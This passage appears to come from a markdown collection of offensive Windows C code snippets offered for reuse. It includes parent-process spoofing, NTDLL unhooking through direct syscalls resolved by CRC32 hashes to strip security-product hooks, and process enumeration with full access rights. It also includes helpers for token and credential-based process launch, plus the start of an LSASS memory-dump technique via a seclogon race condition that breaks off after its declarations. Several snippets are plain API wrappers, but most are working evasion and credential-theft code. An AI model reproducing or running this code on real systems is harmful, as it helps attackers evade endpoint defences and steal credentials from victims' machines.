	StartupInfoEx.StartupInfo.cb	= sizeof(STARTUPINFOEXA);
	StartupInfoEx.lpAttributeList	= pThreadAttList;

	if (!CreateProcessA(NULL, cProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, pcDuplicateStr, &StartupInfoEx.StartupInfo, pProcessInfo)) {
		printf("[!] CreateProcessA Failed with Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

_END_OF_FUNC:
	if (pcDuplicateStr)
		free(pcDuplicateStr);
	if (pThreadAttList)
		DeleteProcThreadAttributeList(pThreadAttList);
	if (pThreadAttList)
		HeapFree(GetProcessHeap(), 0x00, pThreadAttList);
	return pProcessInfo->hProcess ? TRUE : FALSE;
}
```
### Create Process (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL CreateProcessViaWinAPIsW(IN LPWSTR szProcessImgNameAndParms, IN OPTIONAL DWORD dwFlags, OUT PPROCESS_INFORMATION pProcessInfo) {

	if (!szProcessImgNameAndParms || !pProcessInfo)
		return FALSE;

	STARTUPINFOW			StartupInfo		= { .cb = sizeof(STARTUPINFOW)};
	DWORD					dwCreationFlags = dwFlags | NORMAL_PRIORITY_CLASS;

	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));

	if (!CreateProcessW(NULL, szProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &StartupInfo, pProcessInfo)) {
		printf("[!] CreateProcessW Failed with Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### PPID Spoofing (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL CreatePPIDSpoofedProcessW(IN HANDLE hParentProcess, IN LPWSTR szProcessImgNameAndParms, OUT PPROCESS_INFORMATION pProcessInfo) {

	if (!hParentProcess || !szProcessImgNameAndParms || !pProcessInfo)
		return FALSE;

	STARTUPINFOEXW						StartupInfoEx			= { 0 };
	SIZE_T								sThreadAttListSize		= NULL;
	PPROC_THREAD_ATTRIBUTE_LIST			pThreadAttList			= NULL;
	DWORD								dwCreationFlags			= (EXTENDED_STARTUPINFO_PRESENT | DETACHED_PROCESS);
	PWCHAR								pwcDuplicateStr			= NULL,
										pwcLastSlash			= NULL;

	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));
	RtlSecureZeroMemory(&StartupInfoEx, sizeof(STARTUPINFOEXW));

	if (!(pwcDuplicateStr = _wcsdup(szProcessImgNameAndParms))) {
		printf("[!] Failed To Duplicate \"%ws\" - %d\n", szProcessImgNameAndParms, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
		*pwcLastSlash = L'\0';

	if (!InitializeProcThreadAttributeList(NULL, 0x01, 0x00, &sThreadAttListSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
		printf("[!] InitializeProcThreadAttributeList [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttListSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!InitializeProcThreadAttributeList(pThreadAttList, 0x01, 0x00, &sThreadAttListSize)) {
		printf("[!] InitializeProcThreadAttributeList [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, 0x00, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	StartupInfoEx.StartupInfo.cb	= sizeof(STARTUPINFOEXW);
	StartupInfoEx.lpAttributeList	= pThreadAttList;

	if (!CreateProcessW(NULL, szProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, pwcDuplicateStr, &StartupInfoEx.StartupInfo, pProcessInfo)) {
		printf("[!] CreateProcessW Failed with Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

_END_OF_FUNC:
	if (pwcDuplicateStr)
		free(pwcDuplicateStr);
	if (pThreadAttList)
		DeleteProcThreadAttributeList(pThreadAttList);
	if (pThreadAttList)
		HeapFree(GetProcessHeap(), 0x00, pThreadAttList);
	return pProcessInfo->hProcess ? TRUE : FALSE;
}
```	
### Process Enumeration Via EnumProcesses
```c
#include <windows.h>
#include <stdio.h>
#include <psapi.h>

BOOL GetProcessHandleViaModuleEnum(IN LPWSTR szProcessName, OUT PHANDLE phProcess, OUT OPTIONAL PDWORD pdwProcessID) {

	WCHAR		wcUpperCaseProcName[MAX_PATH]	= { 0x00 };
	DWORD		dwPidArray[1024 * 2]			= { 0x00 };

	DWORD		dwPidArrayLength				= 0x00,
				dwReturnModuleLen				= 0x00;

	HANDLE		hProcess						= NULL;
	HMODULE		hModule							= NULL;

	if (!szProcessName || !phProcess || lstrlenW(szProcessName) >= MAX_PATH)
		return FALSE;

	for (int i = 0; i < lstrlenW(szProcessName); i++) {
		if (szProcessName[i] >= 'a' && szProcessName[i] <= 'z')
			wcUpperCaseProcName[i] = szProcessName[i] - 'a' + 'A';
		else
			wcUpperCaseProcName[i] = szProcessName[i];
	}

	if (!EnumProcesses(dwPidArray, sizeof(dwPidArray), &dwPidArrayLength)) {
		printf("[!] EnumProcesses Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	dwPidArrayLength = dwPidArrayLength / sizeof(DWORD);

	for (int i = 0; i < dwPidArrayLength; i++) {

		if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPidArray[i])) != NULL) {

			WCHAR	szProcName[MAX_PATH]	= { 0x00 };
			WCHAR	szUprProcName[MAX_PATH] = { 0x00 };

			if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnModuleLen)) {
				if (GetLastError() != ERROR_PARTIAL_COPY)
					printf("[!] EnumProcessModules Failed With Error: %d \n", GetLastError());
				goto _CLOSE_PROC_HANDLE;
			}

			if (!GetModuleBaseName(hProcess, hModule, szProcName, (sizeof(szProcName) / sizeof(WCHAR)))) {
				printf("[!] GetModuleBaseName Failed With Error: %d \n", GetLastError());
				goto _CLOSE_PROC_HANDLE;
			}

			if (lstrlenW(szProcName) >= MAX_PATH) {
				goto _CLOSE_PROC_HANDLE;
			}

			for (int i = 0; i < lstrlenW(szProcName); i++) {
				if (szProcName[i] >= 'a' && szProcName[i] <= 'z')
					szUprProcName[i] = szProcName[i] - 'a' + 'A';
				else
					szUprProcName[i] = szProcName[i];
			}

			if (wcscmp(szUprProcName, wcUpperCaseProcName) == 0x00) {

				*phProcess = hProcess;

				if (pdwProcessID)
					*pdwProcessID = dwPidArray[i];

				break;
			}

_CLOSE_PROC_HANDLE:
			if (hProcess)
				CloseHandle(hProcess);
		}

	}

	return (*phProcess) ? TRUE : FALSE;
}
```
### NTDLL Unhooking From a Suspended Process
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"
#include "HellsHall.h"

#define NtProtectVirtualMemory_CRC32		0x17C9087B
#define NtCreateUserProcess_CRC32			0x2B09FF3F
#define NtReadVirtualMemory_CRC32			0xAF816E0A
#define NtTerminateProcess_CRC32			0x83AD29BD
#define NtClose_CRC32						0x0EDFC5CB

// -------------------------------- //// -------------------------------- //// -------------------------------- //

typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtCreateUserProcess;
	NT_SYSCALL	NtReadVirtualMemory;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL	NtTerminateProcess;
	NT_SYSCALL	NtClose;

} NTAPI_FUNC, * PNTAPI_FUNC;

NTAPI_FUNC g_NTAPI = { 0 };

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtCreateUserProcess_CRC32, &g_NTAPI.NtCreateUserProcess)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateUserProcess \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtReadVirtualMemory_CRC32, &g_NTAPI.NtReadVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtReadVirtualMemory \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_NTAPI.NtProtectVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtTerminateProcess_CRC32, &g_NTAPI.NtTerminateProcess)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtTerminateProcess \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtClose_CRC32, &g_NTAPI.NtClose)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtClose \n");
		return FALSE;
	}

	return TRUE;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString) {

	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize = wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //


typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(
	PRTL_USER_PROCESS_PARAMETERS*   pProcessParameters,
	PUNICODE_STRING					ImagePathName,
	PUNICODE_STRING					DllPath,
	PUNICODE_STRING					CurrentDirectory,
	PUNICODE_STRING					CommandLine,
	PVOID							Environment,
	PUNICODE_STRING					WindowTitle,
	PUNICODE_STRING					DesktopInfo,
	PUNICODE_STRING					ShellInfo,
	PUNICODE_STRING					RuntimeData,
	ULONG							Flags
);


BOOL UnhookNtdllFromSuspendedProcess(IN LPWSTR szProcessPath, IN HMODULE hNtdllBase) {

	if (!szProcessPath || !hNtdllBase)
		return FALSE;


	BOOL							bResult							= FALSE;
	fnRtlCreateProcessParametersEx	pRtlCreateProcessParametersEx	= NULL;
	HANDLE							hProcess						= NULL,
									hThread							= NULL;
	NTSTATUS						STATUS							= 0x00;
	PPS_ATTRIBUTE_LIST				pAttributeList					= NULL;
	PRTL_USER_PROCESS_PARAMETERS	pUserProcessParams				= NULL;
	PWCHAR							pwcDuplicateStr					= NULL,
									pwcLastSlash					= NULL;
	WCHAR							szNtProcessPath[MAX_PATH * 2]	= { 0 };
	UNICODE_STRING					NtImagePath						= { 0 },
									ProcCommandLine					= { 0 },
									ProcCurrentDir					= { 0 };
	PS_CREATE_INFO					PsCreateInfo					= { 0 };

	PVOID							pBaseAddress					= NULL,
									pHookedNtdllTxt					= NULL,
									pNewNtdllTxt					= NULL;
	SIZE_T 							sNtdllTxtLength					= NULL,
									sNtdllTxtLength2				= NULL;
	PIMAGE_NT_HEADERS				pImgNtHdrs						= { 0 };
	PIMAGE_SECTION_HEADER			pImgSecHdr						= { 0 };
	DWORD							dwOldProtection					= 0x00;
	SIZE_T							sNumberOfBytesRead				= 0x00;


	if (!InitializeNtSyscalls())
		return FALSE;

	if (!(pRtlCreateProcessParametersEx = GetProcAddress(hNtdllBase, "RtlCreateProcessParametersEx"))) {
		printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!(pAttributeList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST)))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		return FALSE;
	}

	if (!(pwcDuplicateStr = _wcsdup(szProcessPath))) {
		printf("[!] Failed To Duplicate \"%ws\" - %d\n", szProcessPath, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
		*pwcLastSlash = L'\0';

	wsprintfW(szNtProcessPath, L"\\??\\%s", szProcessPath);
	RtlInitUnicodeString(&NtImagePath, szNtProcessPath);
	RtlInitUnicodeString(&ProcCommandLine, szProcessPath);
	RtlInitUnicodeString(&ProcCurrentDir, pwcDuplicateStr);

	if (!NT_SUCCESS((STATUS = pRtlCreateProcessParametersEx(&pUserProcessParams, &NtImagePath, NULL, &ProcCurrentDir, &ProcCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED)))) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	pAttributeList->TotalLength					= sizeof(PS_ATTRIBUTE_LIST);
	pAttributeList->Attributes[0].Attribute		= PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size			= NtImagePath.Length;
	pAttributeList->Attributes[0].Value			= (ULONG_PTR)NtImagePath.Buffer;

	PsCreateInfo.Size							= sizeof(PS_CREATE_INFO);
	PsCreateInfo.State							= PsCreateInitialState;

	SET_SYSCALL(g_NTAPI.NtCreateUserProcess);
	if (!NT_SUCCESS((STATUS = RunSyscall(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_SUSPENDED, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, pUserProcessParams, &PsCreateInfo, pAttributeList)))) {
		printf("[!] NtCreateUserProcess Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}


	printf("[DEBUG] ProcessId : %d \n", GetProcessId(hProcess));


	pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)hNtdllBase + ((PIMAGE_DOS_HEADER)hNtdllBase)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	if (!(pBaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pImgNtHdrs->OptionalHeader.SizeOfImage))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		return FALSE;
	}

	SET_SYSCALL(g_NTAPI.NtReadVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, hNtdllBase, pBaseAddress, pImgNtHdrs->OptionalHeader.SizeOfImage, &sNumberOfBytesRead))) || sNumberOfBytesRead != pImgNtHdrs->OptionalHeader.SizeOfImage) {
		printf("[!] NtReadVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		printf("[i] Read %d Of %d Bytes \n", (int)sNumberOfBytesRead, (int)pImgNtHdrs->OptionalHeader.SizeOfImage);
		goto _END_OF_FUNC;
	}

	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		// same as strcmp(pSectionHeader[i].Name, ".text") == 0
		if ((*(ULONG*)pImgSecHdr[i].Name | 0x20202020) == 'xet.') {

			pHookedNtdllTxt		= (PVOID)((ULONG_PTR)hNtdllBase + pImgSecHdr[i].VirtualAddress);
			pNewNtdllTxt		= (PVOID)((ULONG_PTR)pBaseAddress + pImgSecHdr[i].VirtualAddress);
			sNtdllTxtLength		= sNtdllTxtLength2	= (SIZE_T)pImgSecHdr[i].Misc.VirtualSize;
			break;
		}
	}

	if (!pHookedNtdllTxt || !pNewNtdllTxt || !sNtdllTxtLength)
		goto _END_OF_FUNC;

	SET_SYSCALL(g_NTAPI.NtProtectVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(NtCurrentProcess(), &pHookedNtdllTxt, &sNtdllTxtLength, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	memcpy(pHookedNtdllTxt, pNewNtdllTxt, sNtdllTxtLength2);

	SET_SYSCALL(g_NTAPI.NtProtectVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(NtCurrentProcess(), &pHookedNtdllTxt, &sNtdllTxtLength, dwOldProtection, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pAttributeList)
		HeapFree(GetProcessHeap(), 0x00, pAttributeList);
	if (pBaseAddress)
		HeapFree(GetProcessHeap(), 0x00, pBaseAddress);
	if (pwcDuplicateStr)
		free(pwcDuplicateStr);
	if (hProcess) {
		SET_SYSCALL(g_NTAPI.NtTerminateProcess);
		if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, 0x00)))) {
			printf("[!] NtTerminateProcess Failed With Error: 0x%0.8X \n", STATUS);
			return FALSE;
		}
		SET_SYSCALL(g_NTAPI.NtClose);
		if (!NT_SUCCESS((STATUS = RunSyscall(hProcess)))) {
			printf("[!] NtClose [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
			return FALSE;
		}
	}
	if (hThread) {
		SET_SYSCALL(g_NTAPI.NtClose);
		if (!NT_SUCCESS((STATUS = RunSyscall(hThread)))) {
			printf("[!] NtClose [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
			return FALSE;
		}
	}
	return bResult;
}
```
### Get Username Via Process Token (Unicode)
```c
#include <windows.h>
#include <stdio.h>
#define STATUS_SUCCESS              0x00000000
#define STATUS_BUFFER_TOO_SMALL     0xC0000023

typedef NTSTATUS(NTAPI* fnNtQueryInformationToken)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);


BOOL FetchUserNameFromTokenW(IN HANDLE hToken, OUT LPWSTR* szUsername) {

    BOOL                            bResult                     = FALSE;
    NTSTATUS                        STATUS                      = 0x00;
    PTOKEN_USER                     pTokenUser                  = NULL;
    SID_NAME_USE                    SidName                     = { 0 };
    fnNtQueryInformationToken       pNtQueryInformationToken    = NULL;
    ULONG                           uReturnLength               = 0x00,
                                    uUserLen                    = 0x00,
                                    uDomnLen                    = 0x00,
                                    uTotalLength                = 0x00;
    PVOID                           pUserStr                    = NULL,
                                    pDomainStr                  = NULL;

    if (!hToken || !szUsername)
        return FALSE;

    if (!(pNtQueryInformationToken = (fnNtQueryInformationToken)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryInformationToken"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationToken(hToken, TokenUser, NULL, 0x00, &uReturnLength)) != STATUS_SUCCESS && STATUS != STATUS_BUFFER_TOO_SMALL) {
        printf("[!] NtQueryInformationToken [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        return FALSE;
    }

    if (!(pTokenUser = LocalAlloc(LPTR, uReturnLength))) {
        printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationToken(hToken, TokenUser, pTokenUser, uReturnLength, &uReturnLength)) != STATUS_SUCCESS) {
        printf("[!] NtQueryInformationToken [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    if (!LookupAccountSidW(NULL, pTokenUser->User.Sid, NULL, &uUserLen, NULL, &uDomnLen, &SidName)) {

        SidName         = 0x00;
        uTotalLength    = uUserLen + uDomnLen + sizeof(WCHAR);

        if (!(*szUsername = (PSTR)LocalAlloc(LPTR, uTotalLength))) {
            printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }


        pDomainStr  = *szUsername;
        pUserStr    = (*szUsername) + uDomnLen;

        if (!LookupAccountSidW(NULL, pTokenUser->User.Sid, pUserStr, &uUserLen, pDomainStr, &uDomnLen, &SidName)) {
            printf("[!] LookupAccountSidW Failed With Error: %d\n", GetLastError());
            goto _END_OF_FUNC;
        }

        (*szUsername)[uDomnLen] = L'\\';
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pTokenUser)
        LocalFree(pTokenUser);
    if (!bResult && *szUsername)
        LocalFree(*szUsername);
    return bResult;
}
```
### Get Username Via Process Token (ASCII)
```c
#include <windows.h>
#include <stdio.h>
#define STATUS_SUCCESS              0x00000000
#define STATUS_BUFFER_TOO_SMALL     0xC0000023

typedef NTSTATUS(NTAPI* fnNtQueryInformationToken)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);

BOOL FetchUserNameFromTokenA(IN HANDLE hToken, OUT LPSTR* Username) {

    BOOL                            bResult                         = FALSE;
    NTSTATUS                        STATUS                          = 0x00;
    PTOKEN_USER                     pTokenUser                      = NULL;
    SID_NAME_USE                    SidName                         = { 0 };
    fnNtQueryInformationToken       pNtQueryInformationToken        = NULL;
    ULONG                           uReturnLength                   = 0x00,
                                    uUserLen                        = 0x00,
                                    uDomnLen                        = 0x00,
                                    uTotalLength                    = 0x00;
    PVOID                           pUserStr                        = NULL,
                                    pDomainStr                      = NULL;

    if (!hToken || !Username)
        return FALSE;

    if (!(pNtQueryInformationToken = (fnNtQueryInformationToken)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryInformationToken"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationToken(hToken, TokenUser, NULL, 0x00, &uReturnLength)) != STATUS_SUCCESS && STATUS != STATUS_BUFFER_TOO_SMALL) {
        printf("[!] NtQueryInformationToken [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        return FALSE;
    }

    if (!(pTokenUser = LocalAlloc(LPTR, uReturnLength))) {
        printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationToken(hToken, TokenUser, pTokenUser, uReturnLength, &uReturnLength)) != STATUS_SUCCESS) {
        printf("[!] NtQueryInformationToken [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    if (!LookupAccountSidA(NULL, pTokenUser->User.Sid, NULL, &uUserLen, NULL, &uDomnLen, &SidName)) {

        SidName         = 0x00;
        uTotalLength    = uUserLen + uDomnLen + sizeof(CHAR);

        if (!(*Username = (PSTR)LocalAlloc(LPTR, uTotalLength))) {
            printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }


        pDomainStr  = *Username;
        pUserStr    = (*Username) + uDomnLen;

        if (!LookupAccountSidA(NULL, pTokenUser->User.Sid, pUserStr, &uUserLen, pDomainStr, &uDomnLen, &SidName)) {
            printf("[!] LookupAccountSidA Failed With Error: %d\n", GetLastError());
            goto _END_OF_FUNC;
        }

        (*Username)[uDomnLen] = '\\';
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pTokenUser)
        LocalFree(pTokenUser);
    if (!bResult && *Username)
        LocalFree(*Username);
    return bResult;
}
```
### Named Pipe Server (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL CreateNamedPipeServerW(IN LPCWSTR szPipeName) {

    BOOL    bResult             = FALSE;
    HANDLE  hPipe               = INVALID_HANDLE_VALUE;
    CHAR    Buffer[1025]        = { 0 };
    DWORD   dwNmbOfBytesRead    = 0x00;

    if ((hPipe = CreateNamedPipeW(szPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateNamedPipeW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
        printf("[!] ConnectNamedPipe Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ReadFile(hPipe, Buffer, sizeof(Buffer), &dwNmbOfBytesRead, NULL)) {
        printf("[!] ReadFile Failed With Error: %d \n", GetLastError());
        printf("[i] Read %d Bytes \n", dwNmbOfBytesRead);
        goto _END_OF_FUNC;
    }

    Buffer[dwNmbOfBytesRead] = '\0';

    printf("[+] Received Data: \n\n%s\n", Buffer);

    bResult = TRUE;

_END_OF_FUNC:
    if (hPipe != INVALID_HANDLE_VALUE)
        CloseHandle(hPipe);
    return bResult;
}
```
### Create a Process With Custom Credentials (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL RunProcessAsUserA(IN LPCSTR cUserName, IN LPCSTR cDomain, IN LPCSTR cPassword, IN LPCSTR cBinaryAndParams, OUT PPROCESS_INFORMATION pProcessInfo) {

    STARTUPINFOA StartupInfo     = { .cb = sizeof(STARTUPINFOA) };

    if (!CreateProcessWithLogonA(cUserName, cDomain, cPassword, LOGON_WITH_PROFILE, NULL, cBinaryAndParams, 0x00, NULL, NULL, &StartupInfo, pProcessInfo)) {
        printf("[!] CreateProcessWithLogonA Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
```
### Create a Process With Custom Credentials (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL RunProcessAsUserW(IN LPCWSTR szUserName, IN LPCWSTR szDomain, IN LPCWSTR szPassword, IN LPCWSTR szBinaryAndParams, OUT PPROCESS_INFORMATION pProcessInfo) {

    STARTUPINFO StartupInfo     = { .cb = sizeof(STARTUPINFO) };

    if (!CreateProcessWithLogonW(szUserName, szDomain, szPassword, LOGON_WITH_PROFILE, NULL, szBinaryAndParams, 0x00, NULL, NULL, &StartupInfo, pProcessInfo)) {
        printf("[!] CreateProcessWithLogonW Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
```	
### Named Pipe Server (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL CreateNamedPipeServerA(IN LPCSTR cPipeName) {

    BOOL    bResult             = FALSE;
    HANDLE  hPipe               = INVALID_HANDLE_VALUE;
    CHAR    Buffer[1025]        = { 0 };
    DWORD   dwNmbOfBytesRead    = 0x00;

    if ((hPipe = CreateNamedPipeA(cPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateNamedPipeA Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
        printf("[!] ConnectNamedPipe Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ReadFile(hPipe, Buffer, sizeof(Buffer), &dwNmbOfBytesRead, NULL)) {
        printf("[!] ReadFile Failed With Error: %d \n", GetLastError());
        printf("[i] Read %d Bytes \n", dwNmbOfBytesRead);
        goto _END_OF_FUNC;
    }

    Buffer[dwNmbOfBytesRead] = '\0';

    printf("[+] Received Data: \n\n%s\n", Buffer);

    bResult = TRUE;

_END_OF_FUNC:
    if (hPipe != INVALID_HANDLE_VALUE)
        CloseHandle(hPipe);
    return bResult;
}
```
### LSASS Dump Via Seclogon Race Condition
```c
#include <windows.h>
#include <stdio.h>
#include <Windows.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#include <stdio.h>

#include "Structs.h"

#pragma comment (lib, "Dbghelp.lib")

// ==============================================================================================================================================================================================

#define SECLOGON_PATH	L"\\WINDOWS\\system32\\seclogon.dll"
#define FILE_TO_LOCK	L"\\WINDOWS\\System32\\license.rtf"

// CHANGE:
#define	LOGON_USERNAME	L"NUL0x4C"
#define	LOGON_DOMAIN	L"NUL0x4C_DOMAIN"
#define	LOGON_PASSWORD	L"NUL0x4C_PASS"

// ==============================================================================================================================================================================================

typedef struct _THREAD_PARM
{
	DWORD	dwProcessPid;
	LPWSTR	szCmndLine;

} THREAD_PARM, * PTHREAD_PARM;

typedef struct _MINIDUMP_CALLBACK_PARM
{
	LPVOID		pDumpedBuffer;
	DWORD		dwDumpedBufferSize;

} MINIDUMP_CALLBACK_PARM, * PMINIDUMP_CALLBACK_PARM;

// ==============================================================================================================================================================================================

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* fnNtQueryObject)(HANDLE Handle, OBJECT_INFORMATION_CLASS ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* pRtlCompareUnicodeString)(_In_ PUNICODE_STRING String1, _In_ PUNICODE_STRING String2, _In_ BOOLEAN CaseInSensitive);
typedef NTSTATUS(NTAPI* fnRtlCompareUnicodeString)(IN PUNICODE_STRING String1, IN PUNICODE_STRING String2, IN BOOLEAN CaseInSensitive);
typedef NTSTATUS(NTAPI* fnNtQueryObject)(HANDLE Handle, OBJECT_INFORMATION_CLASS ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* fnNtQueryInformationFile)(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
